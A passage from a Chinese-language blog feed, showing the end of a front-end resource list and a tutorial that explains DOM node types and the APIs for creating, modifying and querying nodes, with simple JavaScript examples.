<p><a href="http://www.chinaw3c.org/how-to-read-spec-gb.html" target="_blank" rel="noopener">如何阅读W3c规范(高博)</a></p>
</li>
<li>
<p><a href="https://developer.yahoo.com/performance/rules.html" target="_blank" rel="noopener">雅虎web性能优化军规</a></p>
</li>
<li>
<p><a href="http://browserdiet.com/zh/" target="_blank" rel="noopener">权威前端性能指南</a></p>
</li>
<li>
<p><a href="http://www.html-js.com/article/Front-end-home-best-practice-in-front-of-the-web-high-performance-CSS" target="_blank" rel="noopener">高性能css</a></p>
</li>
<li>
<p>一些问答社区</p>
</li>
<li>
<p><a href="https://www.quora.com/" target="_blank" rel="noopener">quora</a></p>
</li>
<li>
<p><a href="http://stackoverflow.com/" target="_blank" rel="noopener">stackoverflow</a></p>
</li>
<li>
<p><a href="http://www.zhihu.com/" target="_blank" rel="noopener">知乎</a></p>
</li>
<li>
<p><a href="http://www.html-js.com/qa" target="_blank" rel="noopener">前端乱炖问答区</a></p>
</li>
<li>
<p><a href="http://segmentfault.com/questions/newest" target="_blank" rel="noopener">segmentfault问答区</a></p>
</li>
</ul>
<h4 id="其他"><a class="markdownIt-Anchor" href="#其他"></a> 其他</h4>
<hr />
<ul>
<li><a href="https://github.com/poetries/poetries.github.io/blob/dev/source/_posts/DIV+CSS%E7%B3%BB%E7%BB%9F%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E5%9B%9E%E9%A1%BE.md" target="_blank" rel="noopener">本文Mardown原文件-欢迎转载</a></li>
</ul>
]]></content>
      <categories>
        <category>Front-End</category>
        <category>搬运整理</category>
      </categories>
      <tags>
        <tag>CSS</tag>
        <tag>XHTML</tag>
      </tags>
  </entry>
  <entry>
    <title>DOM编程之API学习总结篇</title>
    <url>/hexolog/post/4ac22b9d.html</url>
    <content><![CDATA[<blockquote>
<p>原文 <a href="http://blog.poetries.top/2016/09/22/DOM%E7%BC%96%E7%A8%8B%E4%B9%8BAPI%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93%E7%AF%87/" target="_blank" rel="noopener">链接</a></p>
</blockquote>
<h3 id="一-基本类型介绍"><a class="markdownIt-Anchor" href="#一-基本类型介绍"></a> 一、基本类型介绍</h3>
<hr />
<h4 id="11-node类型"><a class="markdownIt-Anchor" href="#11-node类型"></a> 1.1 Node类型</h4>
<hr />
<ul>
<li><code>DOM1</code>级定义了一个<code>Node</code>接口，该接口由<code>DOM</code>中所有节点类型实现。这个<code>Node</code>接口在<code>JS</code>中是作为<code>Node</code>类型实现的。在<code>IE9</code>以下版本无法访问到这个类型，<code>JS</code>中所有节点都继承自<code>Node</code>类型，都共享着相同的基本属性和方法</li>
<li><code>Node</code>有一个属性<code>nodeType</code>表示<code>Node</code>的类型，它是一个整数，其数值分别表示相应的<code>Node</code>类型</li>
</ul>
<p><img src="http://7xq6al.com1.z0.glb.clouddn.com/d1.png" alt="" /></p>
<a id="more"></a>
<p><img src="http://7xq6al.com1.z0.glb.clouddn.com/d2.png" alt="" /></p>
<ul>
<li>假设我们要判断一个<code>Node</code>是不是元素，我们可以这样判断</li>
</ul>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(someNode.nodeType == <span class="number">1</span>)&#123;</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">"Node is a element"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>这些<code>Node</code>类型中，我们最常用的就是<code>element</code>，<code>text</code>，<code>attribute</code>，<code>comment</code>，<code>document</code>，<code>document_fragment</code>这几种类型</li>
</ul>
<h5 id="12-element类型"><a class="markdownIt-Anchor" href="#12-element类型"></a> 1.2 Element类型</h5>
<hr />
<p><img src="http://7xq6al.com1.z0.glb.clouddn.com/d3.png" alt="" /></p>
<ul>
<li>
<p><code>Element</code>提供了对元素标签名，子节点和特性的访问，我们常用<code>HTML</code>元素比如<code>div</code>，<code>span</code>，<code>a</code>等标签就是<code>element</code>中的一种。</p>
</li>
<li>
<p><strong><code>Element</code>有下面几条特性：</strong></p>
<ul>
<li><code>nodeType</code>为<code>1</code></li>
<li><code>nodeName</code>为元素标签名，<code>tagName</code>也是返回标签名</li>
<li><code>nodeValue</code>为<code>null</code></li>
<li><code>parentNode</code>可能是<code>Document</code>或<code>Element</code></li>
<li>子节点可能是 <code>Element</code>，<code>Text</code>，<code>Comment</code>，<code>Processing_Instruction</code>，<code>CDATASection</code> 或 <code>EntityReference</code></li>
</ul>
</li>
</ul>
<h5 id="13-text类型"><a class="markdownIt-Anchor" href="#13-text类型"></a> 1.3 Text类型</h5>
<hr />
<p><img src="http://7xq6al.com1.z0.glb.clouddn.com/d4.png" alt="" /></p>
<ul>
<li><code>Text</code>表示文本节点，它包含的是纯文本内容，不能包含<code>html</code>代码，但可以包含转义后的<code>html</code>代码。<code>Text</code>有下面的特性：
<ul>
<li><code>nodeType</code>为<code>3</code></li>
<li><code>nodeName</code>为<code>#text</code></li>
<li><code>nodeValue</code>为文本内容</li>
<li><code>parentNode</code>是一个<code>Element</code></li>
<li>没有子节点</li>
</ul>
</li>
</ul>
<h5 id="14-attr类型"><a class="markdownIt-Anchor" href="#14-attr类型"></a> 1.4 Attr类型</h5>
<hr />
<p><img src="http://7xq6al.com1.z0.glb.clouddn.com/d5.png" alt="" /></p>
<ul>
<li><code>Attr</code>类型表示元素的特性，相当于元素的<code>attributes</code>属性中的节点，它有下面的特性：
<ul>
<li><code>nodeType</code>值为2</li>
<li><code>nodeName</code>是特性的名称</li>
<li><code>nodeValue</code>是特性的值</li>
<li><code>parentNode</code>为<code>null</code></li>
</ul>
</li>
</ul>
<h5 id="15-comment类型"><a class="markdownIt-Anchor" href="#15-comment类型"></a> 1.5 Comment类型</h5>
<hr />
<ul>
<li><code>Comment</code>表示<code>HTML</code>文档中的注释，它有下面的几种特征：
<ul>
<li><code>nodeType</code>为8</li>
<li><code>nodeName</code>为<code>#comment</code></li>
<li><code>nodeValue</code>为注释的内容</li>
<li><code>parentNode</code>可能是<code>Document</code>或<code>Element</code></li>
<li>没有子节点</li>
</ul>
</li>
</ul>
<h5 id="16-document"><a class="markdownIt-Anchor" href="#16-document"></a> 1.6 Document</h5>
<hr />
<p><img src="http://7xq6al.com1.z0.glb.clouddn.com/d6.png" alt="" /></p>
<ul>
<li><code>Document</code>表示文档，在浏览器中，<code>document</code>对象是<code>HTMLDocument</code>的一个实例，表示整个页面，它同时也是<code>window</code>对象的一个属性。<code>Document</code>有下面的特性：
<ul>
<li><code>nodeType</code>为<code>9</code></li>
<li><code>nodeName</code>为<code>#document</code></li>
<li><code>nodeValue</code>为 <code>null</code></li>
<li><code>parentNode</code>为 <code>null</code></li>
<li>子节点可能是一个<code>DocumentType</code>或<code>Element</code></li>
</ul>
</li>
</ul>
<h5 id="17-documentfragment类型"><a class="markdownIt-Anchor" href="#17-documentfragment类型"></a> 1.7 DocumentFragment类型</h5>
<hr />
<ul>
<li>
<p><code>DocumentFragment</code>是所有节点中唯一一个没有对应标记的类型，它表示一种轻量级的文档，可能当作一个临时的仓库用来保存可能会添加到文档中的节点。<code>DocumentFragment</code>有下面的特性：</p>
<ul>
<li><code>nodeType</code>为<code>11</code></li>
<li><code>nodeName</code>为<code>#document-fragment</code></li>
<li><code>nodeValue</code>为<code>null</code></li>
<li><code>parentNode</code>为<code>null</code></li>
</ul>
</li>
<li>
<p>我们简单地介绍了几种常见的<code>Node</code>类型，要记住，<code>HTML</code>中的节点并不只是包括元素节点，它还包括文本节点，注释节点等等。在这里我们只是简单地说明了几种常见的节点.</p>
</li>
</ul>
<h3 id="二-dom提供的几个属性"><a class="markdownIt-Anchor" href="#二-dom提供的几个属性"></a> 二、 DOM提供的几个属性</h3>
<hr />
<h4 id="21-childnodes属性"><a class="markdownIt-Anchor" href="#21-childnodes属性"></a> 2.1 childNodes属性</h4>
<hr />
<ul>
<li>在一棵节点树上，<code>childNodes</code>属性可以用来获取任何一个元素的所有子节点，它是一个包含这个元素全部子元素的数组</li>
</ul>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">element.childNodes</span><br></pre></td></tr></table></figure>
<h4 id="22-nodetype属性"><a class="markdownIt-Anchor" href="#22-nodetype属性"></a> 2.2 nodeType属性</h4>
<hr />
<ul>
<li>节点之间的关系构成了节点层次，<code>html</code> 页面的可以画出一个以<code>html</code>标签为根节点的树形结构<br />
<code>DOM</code> 会把文档看作是一棵树，同时定义了很多方法来操作这棵数中的每一个元素（节点）</li>
</ul>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">"en"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>Document<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">p</span>&gt;</span>hello world!!!<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p><img src="http://7xq6al.com1.z0.glb.clouddn.com/d7.png" alt="" /></p>
<ul>
<li>每一个节点都有<code>nodeType</code>属性</li>
</ul>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">node.nodeType</span><br></pre></td></tr></table></figure>
<ul>
<li><code>nodeType</code>属性总共有12中可能取值，但其中仅有3种有实用价值
<ul>
<li>元素节点的<code>nodeType</code>属性值是1</li>
<li>属性节点的<code>nodeType</code>属性值是2</li>
<li>文本节点的<code>nodeType</code>属性值是3</li>
</ul>
</li>
</ul>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">description.firstChild.nodeValue = text;</span><br></pre></td></tr></table></figure>
<h4 id="23-nodevalue属性"><a class="markdownIt-Anchor" href="#23-nodevalue属性"></a> 2.3 nodeValue属性</h4>
<hr />
<ul>
<li><code>nodeValue</code>属性
<ul>
<li>如果想改变一个文本节点的值，那就使用<code>DOM</code>提供的<code>nodeValue</code>,它用来得到一个节点的值 <code>node.nodeValue</code></li>
<li>需要注意：<code>nodeValue</code>属性获取对象的值时，得到的并不是包含在这个段落里的文本</li>
<li>nodeValue属性不仅可以用来检测节点的值，还可以设置节点的值</li>
</ul>
</li>
</ul>
<h4 id="24-firstchild和lastchild属性"><a class="markdownIt-Anchor" href="#24-firstchild和lastchild属性"></a> 2.4 firstChild和lastChild属性</h4>
<hr />
<ul>
<li>数组元素<code>childNodes[0]</code>有个更直观的同义词。无论如何，只要访问<code>childNodes</code>数组的第一个元素，都可以把它写成<code>firstChild</code></li>
</ul>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">node.firstChild</span><br></pre></td></tr></table></figure>
<p>与下面等价</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">node.childNodes[<span class="number">0</span>]</span><br></pre></td></tr></table></figure>
<ul>
<li><code>DOM</code>还提供了一个与之对应的<code>lastChild</code>属性</li>
</ul>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">node.lastChild</span><br></pre></td></tr></table></figure>
<h3 id="三-节点创建型api"><a class="markdownIt-Anchor" href="#三-节点创建型api"></a> 三、节点创建型API</h3>
<hr />
<ul>
<li>在这里，我将常用的<code>DOM</code>操作<code>api</code>进行分类，首先要介绍的是创建型的<code>api</code>。这一类型的<code>api</code>，简而言之就是用来创建节点的</li>
</ul>
<h4 id="31-createelement"><a class="markdownIt-Anchor" href="#31-createelement"></a> 3.1 createElement</h4>
<hr />
<ul>
<li><code>createElement</code>通过传入指定的一个标签名来创建一个元素，如果传入的标签名是一个未知的，则会创建一个自定义的标签，注意：<code>IE8</code>以下浏览器不支持自定义标签</li>
</ul>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">var</span> div = <span class="built_in">document</span>.createElement(<span class="string">"div"</span>);</span><br></pre></td></tr></table></figure>
<ul>
<li>使用<code>createElement</code>要注意：通过<code>createElement</code>创建的元素并不属于<code>html</code>文档，它只是创建出来，并未添加到<code>html</code>文档中，要调用<code>appendChild</code>或<code>insertBefore</code>等方法将其添加到<code>HTML</code>文档树中</li>
</ul>
<h4 id="32-createtextnode"><a class="markdownIt-Anchor" href="#32-createtextnode"></a> 3.2 createTextNode</h4>
<hr />
<ul>
<li><code>createTextNode</code>用来创建一个文本节点，用法如下</li>
</ul>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">var</span> textNode = <span class="built_in">document</span>.createTextNode(<span class="string">"一个TextNode"</span>);</span><br></pre></td></tr></table></figure>
<ul>
<li><code>createTextNode</code>接收一个参数，这个参数就是文本节点中的文本，和<code>createElement</code>一样，创建后的文本节点也只是独立的一个节点，同样需要<code>appendChild</code>将其添加到<code>HTML</code>文档树中</li>
</ul>
<h4 id="33-clonenode"><a class="markdownIt-Anchor" href="#33-clonenode"></a> 3.3 cloneNode</h4>
<ul>
<li><code>cloneNode</code>是用来返回调用方法的节点的一个副本，它接收一个<code>bool</code>参数，用来表示是否复制子元素，使用如下：</li>
</ul>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> parent = <span class="built_in">document</span>.getElementById(<span class="string">"parentElement"</span>); </span><br><span class="line"><span class="keyword">var</span> parent2 = parent.cloneNode(<span class="literal">true</span>);<span class="comment">// 传入true</span></span><br><span class="line">parent2.id = <span class="string">"parent2"</span>;</span><br></pre></td></tr></table></figure>
<ul>
<li>这段代码通过<code>cloneNode</code>复制了一份<code>parent</code>元素，其中<code>cloneNode</code>的参数为<code>true</code>，表示<code>parent</code>的子节点也被复制，如果传入<code>false</code>，则表示只复制了<code>parent</code>节点</li>
</ul>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">"parent"</span>&gt;</span></span><br><span class="line">    我是父元素的文本</span><br><span class="line">    <span class="tag">&lt;<span class="name">br</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">span</span>&gt;</span></span><br><span class="line">        我是子元素</span><br><span class="line">    <span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">button</span> <span class="attr">id</span>=<span class="string">"btnCopy"</span>&gt;</span>复制<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line"></span><br><span class="line">var parent = document.getElementById("parent");</span><br><span class="line">document.getElementById("btnCopy").onclick = function()&#123;</span><br><span class="line">	var parent2 = parent.cloneNode(true);</span><br><span class="line">	parent2.id = "parent2";</span><br><span class="line">	document.body.appendChild(parent2);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>
<p>这段代码很简单，主要是绑定<code>button</code>事件，事件内容是复制了一个<code>parent</code>，修改其<code>id</code>，然后添加到文档中</p>
</li>
<li>
<p><strong>这里有几点要注意：</strong></p>
<ul>
<li>和<code>createElement</code>一样，<code>cloneNode</code>创建的节点只是游离有<code>html</code>文档外的节点，要调用<code>appendChild</code>方法才能添加到文档树中</li>
<li>如果复制的元素有<code>id</code>，则其副本同样会包含该<code>id</code>，由于<code>id</code>具有唯一性，所以在复制节点后必须要修改其id</li>
<li>调用接收的<code>bool</code>参数最好传入，如果不传入该参数，不同浏览器对其默认值的处理可能不同</li>
</ul>
</li>
<li>
<p>除此之外，我们还有一个需要注意的点：</p>
<ul>
<li>如果被复制的节点绑定了事件，则副本也会跟着绑定该事件吗？这里要分情况讨论：
<ul>
<li>如果是通过<code>addEventListener</code>或者比如<code>onclick</code>进行绑定事件，则副本节点不会绑定该事件</li>
<li>如果是内联方式绑定比如</li>
</ul>
</li>
</ul>
</li>
</ul>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">onclick</span>=<span class="string">"showParent()"</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure>
<ul>
<li>这样的话，副本节点同样会触发事件</li>
</ul>
<h4 id="34-createdocumentfragment"><a class="markdownIt-Anchor" href="#34-createdocumentfragment"></a> 3.4 createDocumentFragment</h4>
<hr />
<ul>
<li>
<p><code>createDocumentFragment</code>方法用来创建一个<code>DocumentFragment</code>。在前面我们说到<code>DocumentFragment</code>表示一种轻量级的文档，它的作用主要是存储临时的节点用来准备添加到文档中</p>
</li>
<li>
<p><code>createDocumentFragment</code>方法主要是用于添加大量节点到文档中时会使用到。假设要循环一组数据，然后创建多个节点添加到文档中</p>
</li>
</ul>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">&lt;ul id=<span class="string">"list"</span>&gt;&lt;<span class="regexp">/ul&gt;</span></span><br><span class="line"><span class="regexp">&lt;input type="button" value="添加多项" id="btnAdd" /</span>&gt;</span><br><span class="line"></span><br><span class="line"><span class="built_in">document</span>.getElementById(<span class="string">"btnAdd"</span>).onclick = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">	<span class="keyword">var</span> list = <span class="built_in">document</span>.getElementById(<span class="string">"list"</span>);</span><br><span class="line">	<span class="keyword">for</span>(<span class="keyword">var</span> i = <span class="number">0</span>;i &lt; <span class="number">100</span>; i++)&#123;</span><br><span class="line">		<span class="keyword">var</span> li = <span class="built_in">document</span>.createElement(<span class="string">"li"</span>);</span><br><span class="line">		li.textContent = i;</span><br><span class="line">		list.appendChild(li);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>
<p>这段代码将按钮绑定了一个事件，这个事件创建了100个<code>li</code>节点，然后依次将其添加<code>HTML</code>文档中。这样做有一个缺点：每次一创建一个新的元素，然后添加到文档树中，这个过程会造成浏览器的回流。所谓回流简单说就是指元素大小和位置会被重新计算，如果添加的元素太多，会造成性能问题。这个时候，就是使用<code>createDocumentFragment了</code></p>
</li>
<li>
<p><code>DocumentFragment</code>不是文档树的一部分，它是保存在内存中的，所以不会造成回流问题。我们修改上面的代码如下</p>
</li>
</ul>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="built_in">document</span>.getElementById(<span class="string">"btnAdd"</span>).onclick = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">	<span class="keyword">var</span> list = <span class="built_in">document</span>.getElementById(<span class="string">"list"</span>);	</span><br><span class="line">	<span class="keyword">var</span> fragment = <span class="built_in">document</span>.createDocumentFragment();</span><br><span class="line"></span><br><span class="line">	<span class="keyword">for</span>(<span class="keyword">var</span> i = <span class="number">0</span>;i &lt; <span class="number">100</span>; i++)&#123;</span><br><span class="line">	  <span class="keyword">var</span> li = <span class="built_in">document</span>.createElement(<span class="string">"li"</span>);</span><br><span class="line">		li.textContent = i;</span><br><span class="line">		fragment.appendChild(li);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	list.appendChild(fragment);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>优化后的代码主要是创建了一个<code>fragment</code>，每次生成的<code>li</code>节点先添加到<code>fragment</code>，最后一次性添加到<code>list</code></li>
</ul>
<h4 id="35-创建型api总结"><a class="markdownIt-Anchor" href="#35-创建型api总结"></a> 3.5 创建型API总结</h4>
<hr />
<ul>
<li>
<p>创建型<code>api</code>主要包括<code>createElement</code>，<code>createTextNode</code>，<code>cloneNode</code>和<code>createDocumentFragment</code>四个方法，需要注意下面几点：</p>
<ul>
<li>它们创建的节点只是一个孤立的节点，要通过<code>appendChild</code>添加到文档中</li>
<li><code>cloneNode</code>要注意如果被复制的节点是否包含子节点以及事件绑定等问题</li>
<li>使用<code>createDocumentFragment</code>来解决添加大量节点时的性能问题</li>
</ul>
</li>
</ul>
<h3 id="四-页面修改型api"><a class="markdownIt-Anchor" href="#四-页面修改型api"></a> 四、页面修改型API</h3>
<hr />
<ul>
<li>前面我们提到创建型<code>api</code>，它们只是创建节点，并没有真正修改到页面内容，而是要调用<code>appendChild</code>来将其添加到文档树中。我在这里将这类会修改到页面内容归为一类。<br />
修改页面内容的<code>api</code>主要包括：<code>appendChild</code>，<code>insertBefore</code>，<code>removeChild</code>，<code>replaceChild</code></li>
</ul>
<h4 id="41-appendchild"><a class="markdownIt-Anchor" href="#41-appendchild"></a> 4.1 appendChild</h4>
<hr />
<ul>
<li><code>appendChild</code>我们在前面已经用到多次，就是将指定的节点添加到调用该方法的节点的子元素的末尾。调用方法如下：</li>
</ul>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">parent.appendChild(child);</span><br></pre></td></tr></table></figure>
<ul>
<li>
<p><code>child</code>节点将会作为<code>parent</code>节点的最后一个子节点</p>
</li>
<li>
<p><code>appendChild</code>这个方法很简单，但是还有有一点需要注意：如果被添加的节点是一个页面中存在的节点，则执行后这个节点将会添加到指定位置，其原本所在的位置将移除该节点，也就是说不会同时存在两个该节点在页面上，相当于把这个节点移动到另一个地方</p>
</li>
</ul>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">"child"</span>&gt;</span></span><br><span class="line">    要被添加的节点</span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">br</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">br</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">br</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">"parent"</span>&gt;</span></span><br><span class="line">    要移动的位置</span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span>		</span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">id</span>=<span class="string">"btnMove"</span> <span class="attr">type</span>=<span class="string">"button"</span> <span class="attr">value</span>=<span class="string">"移动节点"</span> /&gt;</span></span><br><span class="line"></span><br><span class="line">document.getElementById("btnMove").onclick = function()&#123;</span><br><span class="line">	var child = document.getElementById("child");</span><br><span class="line">	document.getElementById("parent").appendChild(child);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>这段代码主要是获取页面上的<code>child</code>节点，然后添加到指定位置，可以看到原本的<code>child</code>节点被移动到<code>parent</code>中了。<br />
这里还有一个要注意的点：如果<code>child</code>绑定了事件，被移动时，它依然绑定着该事件</li>
</ul>
<h4 id="42-insertbefore"><a class="markdownIt-Anchor" href="#42-insertbefore"></a> 4.2 insertBefore</h4>
<hr />
<ul>
<li><code>insertBefore</code>用来添加一个节点到一个参照节点之前，用法如下</li>
</ul>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">parentNode.insertBefore(newNode,refNode);</span><br></pre></td></tr></table></figure>
<ul>
<li><code>parentNode</code>表示新节点被添加后的父节点</li>
<li><code>newNode</code>表示要添加的节点</li>
<li><code>refNode</code>表示参照节点，新节点会添加到这个节点之前</li>
</ul>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">"parent"</span>&gt;</span></span><br><span class="line">    父节点</span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">"child"</span>&gt;</span>				</span><br><span class="line">        子元素</span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"button"</span> <span class="attr">id</span>=<span class="string">"insertNode"</span> <span class="attr">value</span>=<span class="string">"插入节点"</span> /&gt;</span></span><br><span class="line"></span><br><span class="line">var parent = document.getElementById("parent");</span><br><span class="line">var child = document.getElementById("child");</span><br><span class="line">document.getElementById("insertNode").onclick = function()&#123;</span><br><span class="line">	var newNode = document.createElement("div");</span><br><span class="line">	newNode.textContent = "新节点"</span><br><span class="line">	parent.insertBefore(newNode,child);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>
<p>这段代码创建了一个新节点，然后添加到<code>child</code>节点之前</p>
</li>
<li>
<p>和<code>appendChild</code>一样，如果插入的节点是页面上的节点，则会移动该节点到指定位置，并且保留其绑定的事件。</p>
</li>
<li>
<p><strong>关于第二个参数参照节点还有几个注意的地方：</strong></p>
<ul>
<li><code>refNode</code>是必传的，如果不传该参数会报错</li>
<li>如果<code>refNode</code>是<code>undefined</code>或<code>null</code>，则<code>insertBefore</code>会将节点添加到子元素的末尾</li>
</ul>
</li>
</ul>
<h4 id="43-removechild"><a class="markdownIt-Anchor" href="#43-removechild"></a> 4.3 removeChild</h4>
<hr />
<ul>
<li><code>removeChild</code>顾名思义，就是删除指定的子节点并返回，用法如下</li>
</ul>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">var</span> deletedChild = parent.removeChild(node);</span><br></pre></td></tr></table></figure>
<ul>
<li>
<p><code>deletedChild</code>指向被删除节点的引用，它等于<code>node</code>，被删除的节点仍然存在于内存中，可以对其进行下一步操作。</p>
</li>
<li>
<p><strong>注意</strong>：如果被删除的节点不是其子节点，则程序将会报错。我们可以通过下面的方式来确保可以删除：</p>
</li>
</ul>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(node.parentNode)&#123;</span><br><span class="line">    node.parentNode.removeChild(node);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>通过节点自己获取节点的父节点，然后将自身删除</li>
</ul>
<h4 id="44-replacechild"><a class="markdownIt-Anchor" href="#44-replacechild"></a> 4.4 replaceChild</h4>
<hr />
<ul>
<li><code>replaceChild</code>用于使用一个节点替换另一个节点，用法如下</li>
</ul>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">parent.replaceChild(newChild,oldChild);</span><br></pre></td></tr></table></figure>
<ul>
<li><code>newChild</code>是替换的节点，可以是新的节点，也可以是页面上的节点，如果是页面上的节点，则其将被转移到新的位置</li>
<li><code>oldChild</code>是被替换的节点</li>
</ul>
<h4 id="45-页面修改型api总结"><a class="markdownIt-Anchor" href="#45-页面修改型api总结"></a> 4.5 页面修改型API总结</h4>
<hr />
<ul>
<li>页面修改型api主要是这四个接口，<strong>要注意几个特点</strong>：
<ul>
<li>不管是新增还是替换节点，如果新增或替换的节点是原本存在页面上的，则其原来位置的节点将被移除，也就是说同一个节点不能存在于页面的多个位置</li>
<li>节点本身绑定的事件会不会消失，会一直保留着</li>
</ul>
</li>
</ul>
<h3 id="五-节点查询型api"><a class="markdownIt-Anchor" href="#五-节点查询型api"></a> 五、节点查询型API</h3>
<hr />
<ul>
<li>节点查询型<code>API</code>也是非常常用的</li>
</ul>
<h4 id="51-documentgetelementbyid"><a class="markdownIt-Anchor" href="#51-documentgetelementbyid"></a> 5.1 document.getElementById</h4>
<hr />
<ul>
<li>
<p>这个接口很简单，根据元素<code>id</code>返回元素，返回值是<code>Element</code>类型，如果不存在该元素，则返回<code>null</code></p>
</li>
<li>
<p><strong>使用这个接口有几点要注意：</strong></p>
<ul>
<li>元素的<code>Id</code>是大小写敏感的，一定要写对元素的<code>id</code></li>
<li><code>HTML</code>文档中可能存在多个<code>id</code>相同的元素，则返回第一个元素</li>
<li>只从文档中进行搜索元素，如果创建了一个元素并指定<code>id</code>，但并没有添加到文档中，则这个元素是不会被查找到的</li>
</ul>
</li>
</ul>
<h4 id="52-documentgetelementsbytagname"><a class="markdownIt-Anchor" href="#52-documentgetelementsbytagname"></a> 5.2 document.getElementsByTagName</h4>
<hr />
<ul>
<li>这个接口根据元素标签名获取元素，返回一个即时的<code>HTMLCollection</code>类型，什么是即时的<code>HTMLCollection</code>类型呢？</li>
</ul>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span>&gt;</span>div1<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span>&gt;</span>div2<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">		</span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"button"</span> <span class="attr">value</span>=<span class="string">"显示数量"</span> <span class="attr">id</span>=<span class="string">"btnShowCount"</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"button"</span> <span class="attr">value</span>=<span class="string">"新增div"</span> <span class="attr">id</span>=<span class="string">"btnAddDiv"</span>/&gt;</span>	</span><br><span class="line"></span><br><span class="line">var divList = document.getElementsByTagName("div");</span><br><span class="line">document.getElementById("btnAddDiv").onclick = function()&#123;</span><br><span class="line">	var div = document.createElement("div");</span><br><span class="line">	div.textContent ="div" + (divList.length+1);</span><br><span class="line">	document.body.appendChild(div);</span><br><span class="line">&#125;</span><br><span class="line">	</span><br><span class="line">document.getElementById("btnShowCount").onclick = function()&#123;</span><br><span class="line">        alert(divList.length);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>
